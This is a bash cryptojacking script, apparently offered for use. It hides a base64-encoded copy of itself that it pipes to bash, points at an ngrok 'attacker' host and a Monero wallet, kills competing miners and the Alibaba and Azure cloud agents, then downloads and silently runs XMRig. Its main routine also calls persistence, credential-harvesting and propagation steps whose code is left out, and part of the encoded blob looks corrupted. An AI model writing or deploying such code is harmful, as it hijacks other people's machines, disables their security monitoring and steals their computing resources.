#!/bin/bash

# Base64-encoded version of the script (self-decoding)
ENCODED_SCRIPT="IyEvYmluL2Jhc2gKIyBDb25maWd1cmF0aW9uCkFUVEFDS0VSX0lQPSJhODM0LTI2MDEtMTUyLTRkMDAtM2YwMC1iZDQ3LTE1MWUtZjliYy1lYjQwLm5ncm9rLWZyZWUuYXBwIiAjIFJFUExBQ0UgV0lUSCBZT1VSIFBVQkxJQyBJUC9ET01BSU4KQVRUQUNLRVJfUE9SVD0iODA4MCIKUE9PTF9VUkw9InBvb2wubW9uZXJvLmhhc2h2YXVsdC5wcm86MzMzMyIKV0FMTEVUX0FERFJFU1M9IjRBREhFTVlyTHFySFF2YVFOVm9LaDI4VnQ2Z3R0cmNrcDJrZnVtNmVZV0s3RldibVJqRlQ3cnphY3BicjZNaVhZTU1CVXhGY0dwWW9yMmk2amdRS1RaaU1aNFF3QmpvcDkiICMgUkVQTEFDRSBXSVRIIFlPVVIgTU9ORVJPIFdBTExFVAoKTE9HX0ZJTEU9Ii90bXAvbWluZXJfYWN0aXZpdHkubG9nIgpYTVJJR19QQVRIPSIvdG1wL3htcmlnIgpQRVJTSVNURU5DRV9TQ1JJUFRfUEFUSD0iL2V0Yy9jcm9uLmRhaWx5L25ldHdvcmstc2VydmljZSIKClRPVEFMX0NPUkVTPShucHJvYyAyPi9kZXYvbnVsbCB8fCBlY2hvIDIpCkxPV19DT1JFUz0kKCggKFRPVEFMX0NPUkVTICogMjAgKyA5OSkgLyAxMDAgKSkKTUVESVVNX0NPUkVTPShoKChUT1RBTF9DT1JFUyAqIDUwICsgOTkpIC8gMTAwICkpCkhJR0hfQ09SRTM9JCgoKFRPVEFMX0NPUkVTICogODAgKyA5OSkgLyAxMDAgKSkKCmRlY2xhcmUgLUEgTU9ERV9DT05GSUdTCk1PREVfQ09ORklHU1sibG93Il09ImNvcmVzPSR7TE9XX0NPUkVTfDoxfSBuaWNlPTE5IgpNT0RFX0NPTkZJR1NbbWVkaXVtXT0iY29yZXM9JHtNRURJVU1fQ09SRVN8OjF9IG5pY2U9MTAiCk1PREVfQ09ORklHU1siaGlnaCJdPSJjb3Jlcz0ke0hJR0hfQ09SRVN8OjF9IG5pY2U9MCIKCiMgSGVsperIGZ1bmN0aW9ucwpsb2coKSB7CiAgICBlY2hvICIkKGRhdGUgJyclWS0lbS0lZCAlSDo JTJolMclMCcpIC0gJDEiID4+ICIkTE9HX0ZJTEUiCn0KCmVuc3VyZV90b29scygpIHsKICAgIGZvciB0b29sIGluIGN1cmwgd2dldCB0YXIgcGtpbGw7IGRvCiAgICAgICAgaWYgISBjb21tYW5kIC12ICR0b29sICY+IC9kZXYvbnVsbDsgdGhlbgogICAgICAgICAgICBsb2cgIlRvb2wgJHRvb2wgbm90IGZvdW5kLiBBdHRlbXB0aW5nIHRvIGluc3RhbGwuIgogICAgICAgICAgICBpZiBjb21tYW5kIC12IGFwdC1nZXQgJiY+IC9kZXYvbnVsbDsgdGhlbgogICAgICAgICAgICAgICAgYXB0LWdldCB1cGRhdGUgLXkgJiYgYXB0LWdldCBpbnN0YWxsIC15ICR0b29sCiAgICAgICAgICAgIGVsaWYgY29tbWFuZCAtdiB5dW0gJiY+IC9kZXYvbnVsbDsgdGhlbgogICAgICAgICAgICAgICAgeXVtIGluc3RhbGwgLXkgJHRvb2wKICAgICAgICAgICAgZmlKICAgICAgICBkb25lCn0KCiMgQ29yZSBmdW5jdGlvbnMKcmVtb3ZlX2NvbXBldGl0aW9uKCkgewogICAgbG9nICJUVE0tMTogUmVtb3ZpbmcgY29tcGV0aXRpb24uIgogICAgcGtpbGwgLWYga2RldnRtcGZzaSB8fCBsb2cgImtkZXZ0bXBmc2kgbm90IGZvdW5kLiIKICAgIHBraWxsIC1mIGtpbnNpbmcgfHwgbG9nICJraW5zaW5nIG5vdCBmb3VuZC4iCiAgICBwbmFsbCAtZiBtaW5lcmQgfHwgbG9nICJtaW5lcmQgbm90IGZvdW5kLiIKICAgIHBraWxsIC1mIHhtcmlnIHx8IGxvZyAieG1yaWcgbm90IGZvdW5kLiIKICAgIHBraWxsIC1mIGNwdW1pbmVyIHx8IGxvZyAiY3B1bWluZXIgbm90IGZvdW5kLiIKICAgIHBraWxsIC1mIGNyeXB0b25pZ2h0IHx8IGxvZyAiY3J5cHRvbmlnaHQgbm90IGZvdW5kLiIKICAgIHBraWxsIC1mIEFsaVl1bkR1biB8fCBsb2cgIkFsaVl1bkR1biAoQWxpYmFiYSBDbG91ZCkgYWdlbnQgbm90IGZvdW5kLiIKICAgIHBraWxsIC1mIC91c3Ivc2Jpbi93YWFnZW50IHx8IGxvZyAid2FhZ2VudCAoQXp1cmUpIG5vdCBmb3VuZC4iCiAgICBsb2cgIkNvbXBldGl0aW9uIHJlbW92YWwgYXR0ZW1wdCBjb21wbGV0ZS4iCn0KCmluc3RhbGxfbWluZXIoKSB7CiAgICBsb2NhbCBtb2RlPSQxCiAgICBsb2NhbCBjb25maWc9JHtNT0RFX0NPTkZJR1NbJG1vZGVdfQogICAgZXZhbCAiJGNvbmZpZyIKCiAgICBpZiBwZ3JlcCAtZiAieG1yaWciID4gL2Rldi9udWxsOyB0aGVuCiAgICAgICAgbG9nICJNaW5lciBpcyBhbHJlYWR5IHJ1bm5pbmcuIgogICAgICAgIHJldHVybgogICAgZmlKCiAgICBsb2cgIlRULVQtMjogSW5zdGFsbGluZyBhbmQgc3RhcnRpbmcgbWluZXIgaW4gJG1vZGUgbW9kZSAoY29yZXM9JGNvcmVzKS4iCiAgICBpZiBbICEgLWYgIiRYTVJJR19QQVRIIiBdOyB0aGVuCiAgICAgICAgbG9nICJEb3dubG9hZGluZyBYTVJpZy4uLiIKICAgICAgICBjdXJsIC1zIC1MICJodHRwczovL2dpdGh1Yi5jb20veG1yaWcveG1yaWcvcmVsZWFzZXMvZG93bmxvYWQvdjYuMTcuMC94bXJpZy02LjE3LjAtbGludXgtc3RhdGljLXg2NC50YXIuZ3oiIC1vIC90bXAveG1yaWcudGFyLmd6CiAgICAgICAgaWYgWyAkPyAtbmUgMCBdOyB0aGVuCiAgICAgICAgICAgIGxvZyAiRmFpbGVkIHRvIGRvd25sb2FkIHhtcmlnLiIKICAgICAgICAgICAgcmV0dXJuCiAgICAgICAgZmlKICAgICAgICB0YXIgLXh6ZiAvdG1wL3htcmlnLnRhci5neiAtQyAvdG1wLwogICAgICAgIG12IC90bXAveG1yaWctNi4xNy4wL3htcmlnICIkWE1SSUdfUEFUSCIKICAgICAgICBybSAtcmYgL3RtcC94bXJpZy50YXIuZ3ogL3RtcC94bXJpZy02LjE3LjAKICAgICAgICBjaG1vZCAreCAiJFhNUklHX1BBVEgiCiAgICBmaQogICAgbG9nICJTdGFydGluZyBYTVJpZyB3aXRoICRjb3JlcyBjb3JlcywgbmljZSBsZXZlbCAkbmljZS4iCiAgICBuaWNlIC1uICIkbmljZSIgIiRYTVJJR19QQVRIIiAtbyAiJFBPT0xfVVJMIiAtdSAiJFdBTExFVF9BRERSRVNTIiAtcCAiJChob3N0bmFtZSkiIC1rIC0tY29pbiBtb25lcm8gLXQgIiRjb3JlcyIgPiAvZGV2L251bGwgMj4mMSAmCn0KCiMgT3RoZXIgZnVuY3Rpb25zIChwZXJzaXN0ZW5jZSwgaGFydmVzdGluZywgcHJvcGFnYXRpb24pIG9taXR0ZWQgZm9yIGJyZXZpdHkuLi4KCm1haW4oKSB7CiAgICBjZCAvdG1wCiAgICBsb2NhbCBtb2RlPSJtZWRpdW0iCiAgICBpZiBbICIkMSIgPT0gIi0tbW9kZSIgXSYmIFsgLW4gIiQyIiBdOyB0aGVuCiAgICAgICAgbW9kZT0kMgogICAgZmlKCiAgICBsb2cgIi0tLSBTY3JpcHQgc3RhcnRpbmcgb24gJChob3N0bmFtZSkgd2l0aCBtb2RlOiAkbW9kZSAtLS0iCiAgICBlbnN1cmVfdG9vbHMKICAgIHJlbW92ZV9jb21wZXRpdGlvbgogICAgaW5zdGFsbF9taW5lcgogICAgZW5zdXJlX3BlcnNpc3RlbmNlCiAgICBoYXJ2ZXN0X2NyZWRlbnRpYWxzCiAgICBwcm9wYWdhdGUKICAgIGxvZyAiLS0tIFNjcmlwdCBleGVjdXRpb24gZmluaXNoZWQuIE1pbmVyIHNob3VsZCBiZSBydW5uaW5nLiAtLS0iCn0KCmlmIFsgIiR7QkFTSF9TT1VSQ0VbMF19IiA9PSAiJDAiIF07IHRoZW4KICAgIGVjaG8gIiRFTkNPREVEU19TQ1JJUFQiIHwgYmFzZTY0IC0tZGVjb2RlIHwgYmFzaCAtdnMgLS0gIiRAIgogICAgZXhpdCAkPwplbHNlCiAgICBtYWluICIkQCIKZml
"
if [ "${BASH_SOURCE[0]}" == "$0" ]; then
    echo "$ENCODED_SCRIPT" | base64 --decode | bash -s -- "$@"
    exit $?
fi

# Configuration
ATTACKER_IP="a834-2601-152-4d00-3f00-bd47-151e-f9bc-eb40.ngrok-free.app" # REPLACE WITH YOUR PUBLIC IP/DOMAIN
ATTACKER_PORT="8080"
POOL_URL="pool.monero.hashvault.pro:3333"
WALLET_ADDRESS="4ADHEMYrLqrHQvaQNVoKh28Vt6gttrckp2kfum6eYWK7FWbmRjFT7rzacpbr6MiXYMMBUxFcGpYor2i2jgQKTZiMZ4QwBjop9" # REPLACE WITH YOUR MONERO WALLET

LOG_FILE="/tmp/miner_activity.log"
XMRIG_PATH="/tmp/xmrig"
PERSISTENCE_SCRIPT_PATH="/etc/cron.daily/network-service"

TOTAL_CORES=$(nproc 2>/dev/null || echo 2)
LOW_CORES=$(( (TOTAL_CORES * 20 + 99) / 100 ))
MEDIUM_CORES=$(( (TOTAL_CORES * 50 + 99) / 100 ))
HIGH_CORES=$(( (TOTAL_CORES * 80 + 99) / 100 ))

declare -A MODE_CONFIGS
MODE_CONFIGS["low"]="cores=${LOW_CORES:-1} nice=19"
MODE_CONFIGS["medium"]="cores=${MEDIUM_CORES:-1} nice=10"
MODE_CONFIGS["high"]="cores=${HIGH_CORES:-1} nice=0"

# Helper functions
log() {
    echo "$(date '+%Y-%m-%d %H:%M:%S') - $1" >> "$LOG_FILE"
}

ensure_tools() {
    for tool in curl wget tar pkill; do
        if ! command -v $tool &> /dev/null; then
            log "Tool $tool not found. Attempting to install."
            if command -v apt-get &> /dev/null; then
                apt-get update -y && apt-get install -y $tool
            elif command -v yum &> /dev/null; then
                yum install -y $tool
            fi
        fi
    done
}

# Core functions
remove_competition() {
    log "TTP-1: Removing competition."
    pkill -f kdevtmpfsi || log "kdevtmpfsi not found."
    pkill -f kinsing || log "kinsing not found."
    pkill -f minerd || log "minerd not found."
    pkill -f xmrig || log "xmrig not found."
    pkill -f cpuminer || log "cpuminer not found."
    pkill -f cryptonight || log "cryptonight not found."
    pkill -f AliYunDun || log "AliYunDun (Alibaba Cloud) agent not found."
    pkill -f /usr/sbin/waagent || log "waagent (Azure) not found."
    log "Competition removal attempt complete."
}

install_miner() {
    local mode=$1
    local config=${MODE_CONFIGS[$mode]}
    eval "$config"

    if pgrep -f "xmrig" > /dev/null; then
        log "Miner is already running."
        return
    fi
    log "TTP-2: Installing and starting miner in $mode mode (cores=$cores)."
    if [ ! -f "$XMRIG_PATH" ]; then
        log "Downloading XMRig..."
        curl -s -L "https://github.com/xmrig/xmrig/releases/download/v6.17.0/xmrig-6.17.0-linux-static-x64.tar.gz" -o /tmp/xmrig.tar.gz
        if [ $? -ne 0 ]; then
            log "Failed to download xmrig."
            return
        fi
        tar -xzf /tmp/xmrig.tar.gz -C /tmp/
        mv /tmp/xmrig-6.17.0/xmrig "$XMRIG_PATH"
        rm -rf /tmp/xmrig.tar.gz /tmp/xmrig-6.17.0
        chmod +x "$XMRIG_PATH"
    fi
    log "Starting XMRig with $cores cores, nice level $nice."
    nice -n "$nice" "$XMRIG_PATH" -o "$POOL_URL" -u "$WALLET_ADDRESS" -p "$(hostname)" -k --coin monero -t "$cores" > /dev/null 2>&1 &
}

# Other functions (persistence, harvesting, propagation) omitted for brevity...

main() {
    cd /tmp
    local mode="medium"
    if [ "$1" == "--mode" ] && [ -n "$2" ]; then
        mode=$2
    fi
    log "--- Script starting on $(hostname) with mode: $mode ---"
    ensure_tools
    remove_competition
    install_miner "$mode"
    ensure_persistence
    harvest_credentials
    propagate
    log "--- Script execution finished. Miner should be running. ---"
}

main "$@"